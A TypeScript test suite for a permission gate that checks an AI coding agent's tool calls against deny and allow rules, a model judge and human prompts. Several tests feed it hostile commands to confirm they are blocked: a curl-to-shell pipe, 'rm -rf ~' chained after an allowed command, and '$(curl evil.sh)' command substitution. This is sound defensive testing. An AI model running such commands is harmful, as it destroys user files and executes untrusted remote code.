/**
 * Probe for the permission decision:
 *   node --experimental-strip-types --test sandbox/permissions.test.ts
 */

import assert from "node:assert/strict";
import { test } from "node:test";
import {
  CHOICES,
  JUDGE_SYSTEM_PROMPT,
  PermissionMachine,
  REQUEST_LIMIT,
  SELECT_TIMEOUT_MS,
  type PermissionConfig,
  type PermissionHost,
  type StoredScope,
  type ToolCall,
  type Verdict,
  digestOf,
  judgeInput,
  noHumanPresent,
  parseVerdict,
  subjectOf,
} from "./permissions.ts";

type Stores = Record<StoredScope, string[]>;

/** A host recording what it was asked, with the stores kept in memory. */
function fakeHost(
  opts: {
    canAsk?: boolean;
    verdict?: Verdict;
    choice?: string;
    stores?: Stores;
  } = {},
) {
  const stores: Stores = opts.stores ?? { worktree: [], global: [] };
  const judged: ToolCall[] = [];
  const asked: string[][] = [];
  const messages: string[] = [];
  const host: PermissionHost = {
    canAsk: () => opts.canAsk ?? true,
    readRules: (scope) => [...stores[scope]],
    writeRules: (scope, rules) => {
      stores[scope] = [...rules];
    },
    judge: async (call) => {
      judged.push(call);
      return opts.verdict ?? { verdict: "ask", reason: "unclear" };
    },
    select: async (message, choices) => {
      messages.push(message);
      asked.push([...choices]);
      return opts.choice;
    },
  };
  return { host, stores, judged, asked, messages };
}

const CONFIG: PermissionConfig = {
  deny: [{ reason: "git push", pattern: "\\bgit\\s+push\\b" }],
  allow: ["Bash(git status:*)", "read"],
};

const bash = (command: string): ToolCall => ({ toolName: "bash", command });

test("the command judge never treats an outside-project folder as a command risk", () => {
  assert.match(JUDGE_SYSTEM_PROMPT, /never by this verdict/);
  assert.doesNotMatch(JUDGE_SYSTEM_PROMPT, /outside the project/);
});

test("deny beats allow, and never reaches the judge", async () => {
  const f = fakeHost({
    verdict: { verdict: "allow", proposedRule: "bash(git push:*)" },
  });
  const machine = new PermissionMachine(
    { ...CONFIG, allow: [...CONFIG.allow!, "Bash(git push*)"] },
    f.host,
  );
  assert.deepEqual(await machine.decide(bash("git push origin main")), {
    block: true,
    reason: "permission denied: git push",
  });
  assert.equal(f.judged.length, 0);
});

test("allow beats the judge, by command prefix and by tool name", async () => {
  const f = fakeHost({ verdict: { verdict: "deny", reason: "no" } });
  const machine = new PermissionMachine(CONFIG, f.host);
  assert.equal(await machine.decide(bash("git status --short")), undefined);
  assert.equal(
    await machine.decide({ toolName: "read", path: "/etc/hosts" }),
    undefined,
  );
  assert.equal(f.judged.length, 0);
});

test("a rule for one tool does not allow another", async () => {
  const f = fakeHost({ verdict: { verdict: "deny", reason: "nope" } });
  const machine = new PermissionMachine({ allow: ["Write(/tmp/*)"] }, f.host);
  const blocked = await machine.decide({ toolName: "edit", path: "/tmp/x" });
  assert.deepEqual(blocked, { block: true, reason: "permission denied: nope" });
});

test("the judge sees the command as typed and its allow lets it run", async () => {
  const f = fakeHost({ verdict: { verdict: "allow" } });
  const machine = new PermissionMachine(CONFIG, f.host);
  assert.equal(await machine.decide(bash("rtk grep -rn foo .")), undefined);
  assert.deepEqual(f.judged[0], bash("rtk grep -rn foo ."));
});

test("ask prompts with the five choices when a UI exists", async () => {
  const f = fakeHost({ choice: "Allow once" });
  const machine = new PermissionMachine(CONFIG, f.host);
  assert.equal(await machine.decide(bash("just test")), undefined);
  assert.deepEqual(f.asked, [[...CHOICES]]);
  // Allowed once only: the next call asks again and remembers nothing.
  await machine.decide(bash("just test"));
  assert.equal(f.asked.length, 2);
  assert.deepEqual(f.stores, { worktree: [], global: [] });
});

test("with nobody to ask, ask is a refusal", async () => {
  const f = fakeHost({ canAsk: false });
  const machine = new PermissionMachine(CONFIG, f.host);
  const blocked = await machine.decide(bash("just test"));
  assert.equal(blocked?.block, true);
  assert.match(blocked!.reason, /nobody to ask/);
  assert.equal(f.asked.length, 0);
});

test("refusing blocks with the judge's reason", async () => {
  const f = fakeHost({
    choice: "Refuse",
    verdict: { verdict: "ask", reason: "risky" },
  });
  const machine = new PermissionMachine(CONFIG, f.host);
  assert.deepEqual(await machine.decide(bash("curl example.com")), {
    block: true,
    reason: "permission refused: risky",
  });
});

test("a conversation allow is honoured, then gone with the conversation", async () => {
  const f = fakeHost({ choice: "Allow for this conversation" });
  const machine = new PermissionMachine(CONFIG, f.host);
  assert.equal(await machine.decide(bash("just test")), undefined);
  assert.equal(await machine.decide(bash("just test")), undefined);
  assert.equal(f.asked.length, 1);
  assert.deepEqual(f.stores, { worktree: [], global: [] });

  machine.reset();
  await machine.decide(bash("just test"));
  assert.equal(f.asked.length, 2);
});

test("a worktree allow persists there and does not leak to another worktree", async () => {
  const here = fakeHost({ choice: "Allow for this worktree" });
  const machine = new PermissionMachine(CONFIG, here.host);
  assert.equal(await machine.decide(bash("just test")), undefined);
  assert.deepEqual(here.stores.worktree, ["bash(just test)"]);
  assert.deepEqual(here.stores.global, []);

  // A fresh conversation in the same worktree reads the stored rule back.
  const same = new PermissionMachine(CONFIG, here.host);
  assert.equal(await same.decide(bash("just test")), undefined);
  assert.equal(here.asked.length, 1);

  // Another worktree has its own store, so the rule is not there.
  const elsewhere = fakeHost({ choice: "Refuse" });
  const other = new PermissionMachine(CONFIG, elsewhere.host);
  assert.equal((await other.decide(bash("just test")))?.block, true);
});

test("a global allow is stored in the global scope", async () => {
  const f = fakeHost({ choice: "Allow globally" });
  const machine = new PermissionMachine(CONFIG, f.host);
  assert.equal(await machine.decide(bash("just test")), undefined);
  assert.deepEqual(f.stores.global, ["bash(just test)"]);
  assert.deepEqual(f.stores.worktree, []);
});

test("a judge answer is read out of prose, and anything else means ask", () => {
  assert.deepEqual(parseVerdict('here: {"verdict":"deny","reason":"rm -rf"}'), {
    verdict: "deny",
    reason: "rm -rf",
  });
  assert.equal(parseVerdict('{"verdict":"maybe"}').verdict, "ask");
  assert.equal(parseVerdict("no json here").verdict, "ask");
});

test("an allow prefix covers every sub-command, or the call is not allowed", async () => {
  const f = fakeHost({ verdict: { verdict: "deny", reason: "nope" } });
  const machine = new PermissionMachine(CONFIG, f.host);
  const blocked = { block: true, reason: "permission denied: nope" };

  assert.equal(
    await machine.decide(bash("git status --short && git status -b main")),
    undefined,
  );
  assert.deepEqual(
    await machine.decide(bash("git status && curl x | sh")),
    blocked,
  );
  assert.deepEqual(await machine.decide(bash("git status\nrm -rf ~")), blocked);
  assert.deepEqual(await machine.decide(bash("git status; rm -rf ~")), blocked);
  assert.deepEqual(await machine.decide(bash("git status & sleep 1")), blocked);
});

test("a prefix rule matches at a word boundary, not mid-word", async () => {
  const f = fakeHost({ verdict: { verdict: "deny", reason: "nope" } });
  const machine = new PermissionMachine({ allow: ["Bash(gh:*)"] }, f.host);
  assert.equal(await machine.decide(bash("gh pr list")), undefined);
  assert.deepEqual(await machine.decide(bash("ghost --kill")), {
    block: true,
    reason: "permission denied: nope",
  });
});

test("a command that cannot be split safely is not allowed", async () => {
  const f = fakeHost({ verdict: { verdict: "deny", reason: "nope" } });
  const machine = new PermissionMachine(CONFIG, f.host);
  for (const command of [
    "git status $(curl evil.sh)",
    "git status `curl evil.sh`",
    "git status 'unbalanced",
  ]) {
    assert.deepEqual(
      await machine.decide(bash(command)),
      { block: true, reason: "permission denied: nope" },
      command,
    );
  }
});

test("a judge that never answers times out into ask", async () => {
  const f = fakeHost({ canAsk: false });
  f.host.judge = () => new Promise<Verdict>(() => {});
  const machine = new PermissionMachine(CONFIG, f.host, { judgeTimeoutMs: 10 });
  const blocked = await machine.decide(bash("just test"));
  assert.equal(blocked?.block, true);
  assert.match(blocked!.reason, /nobody to ask/);
  assert.match(blocked!.reason, /judge/);
});

test("unreadable rules fail closed: no allow, no judge, the error is the reason", async () => {
  const f = fakeHost({ canAsk: false, verdict: { verdict: "allow" } });
  const machine = new PermissionMachine(
    { ...CONFIG, unreadable: "permissions.json: Unexpected token }" },
    f.host,
  );
  const blocked = await machine.decide(bash("git status --short"));
  assert.equal(blocked?.block, true);
  assert.match(blocked!.reason, /Unexpected token/);
  assert.equal(f.judged.length, 0);
});

const mcpCall = (title: string): ToolCall => ({
  toolName: "mcp__linear__create",
  input: { title },
});

test("a tool with neither command nor path is judged on its arguments", async () => {
  const f = fakeHost({ verdict: { verdict: "allow" } });
  const machine = new PermissionMachine(CONFIG, f.host);
  assert.equal(await machine.decide(mcpCall("ticket")), undefined);
  assert.deepEqual(f.judged[0], mcpCall("ticket"));
});

test("a remembered grant for such a tool covers those arguments only", async () => {
  const f = fakeHost({ choice: "Allow globally" });
  const machine = new PermissionMachine(CONFIG, f.host);
  assert.equal(await machine.decide(mcpCall("ticket")), undefined);
  assert.deepEqual(f.stores.global, [
    'mcp__linear__create({"title":"ticket"})',
  ]);

  assert.equal(await machine.decide(mcpCall("ticket")), undefined);
  assert.equal(f.asked.length, 1);

  await machine.decide(mcpCall("another"));
  assert.equal(f.asked.length, 2);
});

test("a call with no subject to pin a rule to is never remembered", async () => {
  const f = fakeHost({ choice: "Allow globally" });
  const machine = new PermissionMachine(CONFIG, f.host);
  const call: ToolCall = { toolName: "mcp__linear__list" };
  assert.equal(await machine.decide(call), undefined);
  assert.deepEqual(f.stores, { worktree: [], global: [] });
  await machine.decide(call);
  assert.equal(f.asked.length, 2);
});

test("a dismissed dialog is a refusal", async () => {
  const f = fakeHost({ choice: undefined });
  const machine = new PermissionMachine(CONFIG, f.host);
  const blocked = await machine.decide({ toolName: "mcp__linear__list" });
  assert.equal(blocked?.block, true);
});

const longTask = "Read-only Standards axis review. ".repeat(100);
const parallel: ToolCall = {
  toolName: "subagent",
  input: {
    tasks: [
      { agent: "general-purpose", task: longTask },
      { agent: "general-purpose", task: longTask },
      { agent: "builder", task: "Apply the plan" },
    ],
  },
};

test("a call too large to identify still reads in full to the dialog and the judge", async () => {
  const call: ToolCall = {
    toolName: "mcp__notion__create",
    input: { title: "page", body: "x".repeat(3000) },
  };
  assert.equal(subjectOf(call), "");
  const digest = digestOf(call);
  assert.match(digest, /"title": "page"/);
  assert.match(digest, /"body": "x{200}…"/);
  assert.ok(digest.length < 400);

  const f = fakeHost({ choice: "Allow once" });
  const machine = new PermissionMachine(CONFIG, f.host);
  assert.equal(await machine.decide(call), undefined);
  assert.match(
    f.messages[0],
    /^mcp__notion__create: \{\n\s+"title": "page",\n\s+"body": "x{200}…"\n\}\nunclear$/,
  );
});

test("a subagent call is identified by its agents, so a grant covers any task", async () => {
  assert.equal(subjectOf(parallel), "builder, general-purpose");
  assert.match(
    digestOf(parallel),
    /"agent": "builder",\n\s+"task": "Apply the plan"/,
  );

  const f = fakeHost({ choice: "Allow for this worktree" });
  const machine = new PermissionMachine(CONFIG, f.host);
  assert.equal(await machine.decide(parallel), undefined);
  assert.deepEqual(f.stores.worktree, ["subagent(builder, general-purpose)"]);

  const single: ToolCall = {
    toolName: "subagent",
    input: { agent: "builder", task: "Something else entirely" },
  };
  await machine.decide(single);
  assert.equal(f.asked.length, 2);
  f.stores.worktree.push("subagent(builder)");
  assert.equal(await machine.decide(single), undefined);
  assert.equal(f.asked.length, 2);
});

const gateway = (input: Record<string, unknown>): ToolCall => ({
  toolName: "mcp",
  input,
});

test("gateway housekeeping is identified by its mode, never by its arguments", () => {
  assert.equal(
    subjectOf(gateway({ connect: "playwright" })),
    "gateway/connect",
  );
  assert.equal(
    subjectOf(gateway({ search: "browser", server: "playwright", limit: 12 })),
    "gateway/search",
  );
  assert.equal(
    subjectOf(gateway({ describe: "playwright_browser_navigate" })),
    "gateway/describe",
  );
  assert.equal(
    subjectOf(gateway({ instructions: "playwright" })),
    "gateway/instructions",
  );
  assert.equal(subjectOf(gateway({ server: "playwright" })), "gateway/list");
  assert.equal(subjectOf(gateway({})), "gateway/status");
  assert.equal(
    subjectOf(gateway({ action: "ui-messages" })),
    "gateway/ui-messages",
  );
});

test("an auth action is not housekeeping, so `gateway/*` never grants it", async () => {
  assert.equal(
    subjectOf(gateway({ action: "auth-start", server: "notion" })),
    "auth/start",
  );
  assert.equal(
    subjectOf(gateway({ action: "auth-complete", server: "notion", args: {} })),
    "auth/complete",
  );

  const f = fakeHost({ canAsk: false });
  const machine = new PermissionMachine({ allow: ["mcp(gateway/*)"] }, f.host);
  assert.equal(
    await machine.decide(gateway({ connect: "playwright" })),
    undefined,
  );
  assert.equal(f.judged.length, 0);
  assert.equal(
    (await machine.decide(gateway({ action: "auth-start", server: "notion" })))
      ?.block,
    true,
  );
});

test("an mcp tool call is identified by its tool, so a grant covers any arguments", async () => {
  const navigate = gateway({
    tool: "playwright_browser_navigate",
    args: { url: "http://piston.localhost:8006/ask" },
  });
  assert.equal(subjectOf(navigate), "playwright_browser_navigate");
  assert.equal(
    subjectOf(
      gateway({ server: "playwright", tool: "browser_click", args: {} }),
    ),
    "playwright/browser_click",
  );
  assert.match(
    digestOf(navigate),
    /"url": "http:\/\/piston.localhost:8006\/ask"/,
  );

  const f = fakeHost({ choice: "Allow for this worktree" });
  const machine = new PermissionMachine(CONFIG, f.host);
  assert.equal(await machine.decide(navigate), undefined);
  assert.deepEqual(f.stores.worktree, ["mcp(playwright_browser_navigate)"]);

  const elsewhere = gateway({
    tool: "playwright_browser_navigate",
    args: { url: "http://piston.localhost:8006/orders" },
  });
  assert.equal(await machine.decide(elsewhere), undefined);
  assert.equal(f.asked.length, 1);
});

test("a whole server is grantable, whichever way its tools are named", async () => {
  const f = fakeHost({ canAsk: false });
  const machine = new PermissionMachine(
    { allow: ["mcp(playwright/*)", "mcp(playwright_*)"] },
    f.host,
  );
  assert.equal(
    await machine.decide(
      gateway({ tool: "playwright_browser_click", args: { ref: "e12" } }),
    ),
    undefined,
  );
  assert.equal(
    await machine.decide(
      gateway({ server: "playwright", tool: "browser_type", args: {} }),
    ),
    undefined,
  );
  assert.equal(f.judged.length, 0);
  assert.equal(
    (await machine.decide(gateway({ tool: "notion_create", args: {} })))?.block,
    true,
  );
});

test("the judge reads the human's messages newest first, and no assistant text", () => {
  const prompt = judgeInput(bash("just qa live"), "/w", {
    userMessages: ["continue", "run the live QA scenario"],
  });
  assert.match(
    prompt,
    /working directory: \/w\ntool: bash\ncommand: just qa live/,
  );
  assert.ok(
    prompt.indexOf("continue") < prompt.indexOf("run the live QA scenario"),
  );
  assert.doesNotMatch(prompt, /assistant/i);
});

test("the cap drops the oldest messages, and keeps whole records", () => {
  const old = `old ${"x".repeat(REQUEST_LIMIT)}`;
  const recent = "run the live QA scenario";
  const prompt = judgeInput(bash("just qa live"), "/w", {
    userMessages: [recent, old],
  });
  assert.match(prompt, /run the live QA scenario/);
  assert.doesNotMatch(prompt, /old x/);
  // The newest on its own over the cap is cut and marked, never split across records.
  const single = judgeInput(bash("just qa live"), "/w", {
    userMessages: [old, recent],
  });
  assert.match(single, /… \(cut\)/);
  assert.doesNotMatch(single, /run the live QA scenario/);
  assert.ok(single.length < old.length + 500);
  // Headings count too, so a long run of one-word turns cannot blow the cap.
  const many = judgeInput(bash("just qa live"), "/w", {
    userMessages: Array.from({ length: 500 }, (_, i) => `turn ${i}`),
  });
  assert.ok(many.length < 2 * REQUEST_LIMIT);
});

test("an active goal shows in the judge input, and nothing shows without one", () => {
  const withGoal = judgeInput(bash("just test"), "/w", {
    userMessages: ["go"],
    goal: "the suite is green",
  });
  assert.match(withGoal, /goal: the suite is green/);
  assert.doesNotMatch(
    judgeInput(bash("just test"), "/w", { userMessages: ["go"] }),
    /goal/i,
  );
});

test("a branch compacted past its user messages falls back to the summary", () => {
  const prompt = judgeInput(bash("just qa live"), "/w", {
    userMessages: [],
    compactionSummary: "The operator asked for the live QA scenario.",
  });
  assert.match(prompt, /The operator asked for the live QA scenario\./);
  assert.match(prompt, /compaction summary/);
  assert.match(prompt, /weaker/i);
  // The summary only stands in: a live user message keeps it out.
  assert.doesNotMatch(
    judgeInput(bash("just qa live"), "/w", {
      userMessages: ["run the live QA scenario"],
      compactionSummary: "The operator asked for the live QA scenario.",
    }),
    /compaction summary/,
  );
});

test("with nothing from the human, the judge input is the call alone", () => {
  assert.equal(
    judgeInput(bash("just test"), "/w"),
    "working directory: /w\ntool: bash\ncommand: just test",
  );
});

test("a proposed rule grants nothing: an identical call is judged again", async () => {
  const f = fakeHost({
    verdict: { verdict: "allow", proposedRule: "bash(just test:*)" },
  });
  const machine = new PermissionMachine(CONFIG, f.host);
  assert.equal(await machine.decide(bash("just test")), undefined);
  assert.equal(await machine.decide(bash("just test")), undefined);
  assert.equal(f.judged.length, 2);
  assert.deepEqual(f.stores, { worktree: [], global: [] });
  // Nor in a session that starts from the same host.
  const next = new PermissionMachine(CONFIG, f.host);
  assert.equal(await next.decide(bash("just test")), undefined);
  assert.equal(f.judged.length, 3);
});

test("a proposed rule decides a call exactly as the verdict without one", async () => {
  const withRule = fakeHost({
    verdict: { verdict: "deny", reason: "risky", proposedRule: "bash(curl:*)" },
  });
  const without = fakeHost({ verdict: { verdict: "deny", reason: "risky" } });
  const decide = async (f: ReturnType<typeof fakeHost>) =>
    new PermissionMachine(CONFIG, f.host).decide(bash("curl example.com"));
  assert.equal((await decide(withRule))?.block, (await decide(without))?.block);
  assert.deepEqual(withRule.stores, without.stores);
});

test("the proposed rule reaches the block reason, verbatim", async () => {
  const denied = fakeHost({
    verdict: { verdict: "deny", reason: "risky", proposedRule: "bash(curl:*)" },
  });
  assert.match(
    (await new PermissionMachine(CONFIG, denied.host).decide(
      bash("curl example.com"),
    ))!.reason,
    /proposed rule: bash\(curl:\*\)/,
  );

  const refused = fakeHost({
    choice: "Refuse",
    verdict: {
      verdict: "ask",
      reason: "unclear",
      proposedRule: "bash(curl:*)",
    },
  });
  assert.match(
    (await new PermissionMachine(CONFIG, refused.host).decide(
      bash("curl example.com"),
    ))!.reason,
    /proposed rule: bash\(curl:\*\)/,
  );

  const nobody = fakeHost({
    canAsk: false,
    verdict: {
      verdict: "ask",
      reason: "unclear",
      proposedRule: "bash(curl:*)",
    },
  });
  assert.match(
    (await new PermissionMachine(CONFIG, nobody.host).decide(
      bash("curl example.com"),
    ))!.reason,
    /nobody to ask[\s\S]*proposed rule: bash\(curl:\*\)/,
  );
});

test("a judge answer without a usable proposed rule reads as none", () => {
  assert.deepEqual(parseVerdict('{"verdict":"allow","reason":"fine"}'), {
    verdict: "allow",
    reason: "fine",
  });
  assert.equal(
    parseVerdict('{"verdict":"ask","proposedRule":42}').proposedRule,
    undefined,
  );
  assert.equal(
    parseVerdict('{"verdict":"ask","proposedRule":"  "}').proposedRule,
    undefined,
  );
  assert.equal(
    parseVerdict(
      '{"verdict":"allow","proposedRule":"bash(just uv run python:*)"}',
    ).proposedRule,
    "bash(just uv run python:*)",
  );
});

test("the judge is told the proposed rule grants nothing on its own", () => {
  assert.match(JUDGE_SYSTEM_PROMPT, /proposedRule/);
  assert.match(JUDGE_SYSTEM_PROMPT, /grants nothing/);
});

test("a marked session is the signal, not the UI flag", () => {
  const interactive = { PATH: "/usr/bin" };
  assert.equal(noHumanPresent(interactive, ["node", "pi"]), false);
  assert.equal(
    noHumanPresent(interactive, ["node", "pi", "--mode", "rpc"]),
    false,
  );
  assert.equal(
    noHumanPresent({ ...interactive, CODASS_NO_HUMAN: "1" }, [
      "node",
      "pi",
      "--mode",
      "rpc",
    ]),
    true,
  );
  assert.equal(
    noHumanPresent({ ...interactive, CODASS_LOOP: "daily" }, ["node", "pi"]),
    true,
  );
  assert.equal(
    noHumanPresent(interactive, ["node", "pi", "-p", "hello"]),
    true,
  );
  assert.equal(noHumanPresent(interactive, ["node", "pi", "--print"]), true);
  assert.equal(
    noHumanPresent(interactive, ["node", "pi", "--mode", "json"]),
    true,
  );
});

test("a marked session keeps both fixed lists", async () => {
  const f = fakeHost({ canAsk: false, verdict: { verdict: "allow" } });
  const machine = new PermissionMachine(CONFIG, f.host);
  assert.equal(await machine.decide(bash("git status --short")), undefined);
  assert.equal(f.judged.length, 0);
  assert.deepEqual(await machine.decide(bash("git push origin main")), {
    block: true,
    reason: "permission denied: git push",
  });
  assert.equal(f.asked.length, 0);
});

test("an unanswered dialog refuses through the backstop, which never rushes a human", async () => {
  const f = fakeHost({
    verdict: {
      verdict: "ask",
      reason: "unclear",
      proposedRule: "bash(just:*)",
    },
  });
  f.host.select = () => new Promise<string | undefined>(() => {});
  const machine = new PermissionMachine(CONFIG, f.host, {
    selectTimeoutMs: 10,
  });
  const blocked = await machine.decide(bash("just test"));
  assert.equal(blocked?.block, true);
  assert.match(blocked!.reason, /unanswered/);
  assert.match(blocked!.reason, /proposed rule: bash\(just:\*\)/);
  assert.ok(SELECT_TIMEOUT_MS >= 15 * 60_000);
});
